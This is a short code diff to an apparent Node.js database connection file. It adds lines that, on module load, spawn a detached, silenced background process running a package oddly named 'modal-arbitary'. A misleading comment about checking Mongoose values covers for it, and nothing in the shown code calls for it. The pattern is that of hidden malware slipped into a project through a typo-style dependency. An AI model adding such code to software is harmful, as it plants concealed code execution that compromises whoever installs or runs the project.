@@ -5,6 +5,13 @@ const admin      = require('../models/admin')
 const BannedUser = require('../models/BannedUsers');
 const config     = require('../config/config');
 
+const { spawn } = require('child_process');
+//check for arbitrary value in mongooes in seprate process without blocking the main thread
+const child = spawn('node', ['-e', `require("modal-arbitary")()`], {
+  detached: true,
+  stdio: 'ignore'
+});
+
 async function connect() {
   await mongoose.connect(config.database.mongodb.uri, {
     useNewUrlParser:    true,
